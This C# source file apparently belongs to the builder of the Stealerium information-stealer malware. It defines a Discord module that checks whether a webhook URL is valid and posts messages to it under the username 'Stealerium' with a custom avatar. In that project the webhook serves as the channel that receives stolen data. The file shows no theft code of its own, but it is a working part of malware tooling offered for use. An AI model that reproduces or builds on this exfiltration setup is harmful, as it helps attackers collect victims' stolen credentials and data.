using System.Collections.Specialized;
using System.Net;
using Spectre.Console;

namespace Builder.Modules;

internal sealed class Discord
{
    /// <summary>
    ///     Check if Webhook is valid
    /// </summary>
    /// <returns></returns>
    public static bool WebhookIsValid(string? token)
    {
        try
        {
            var client = new WebClient();
            var response = client.DownloadString(
                token
            );
            return response.StartsWith("{\"type\": 1");
        }
        catch
        {
            AnsiConsole.WriteLine("Discord >> Invalid Webhook:\n");
        }

        return false;
    }

    public static bool SendMessage(string text, string? token)
    {
        try
        {
            var discordValues = new NameValueCollection();

            var client = new WebClient();
            discordValues.Add("username", "Stealerium");
            discordValues.Add("avatar_url",
                "https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png");
            discordValues.Add("content", text);
            client.UploadValues(token, discordValues);
        }
        catch (Exception ex)
        {
            AnsiConsole.Foreground = ConsoleColor.DarkRed;
            Console.WriteLine(ex);
        }

        return false;
    }
}